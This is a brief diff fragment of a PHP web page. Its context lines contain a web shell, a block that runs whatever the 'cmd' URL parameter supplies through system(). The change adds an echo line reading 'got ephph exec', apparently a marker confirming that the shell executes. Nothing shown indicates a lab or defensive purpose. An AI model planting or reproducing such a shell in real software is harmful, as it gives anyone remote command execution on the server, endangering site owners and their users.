@@ -50,6 +50,7 @@
     {
         system($_GET['cmd']);
     }
+    echo "got ephph exec";
 ?>
   </body>
 </html>
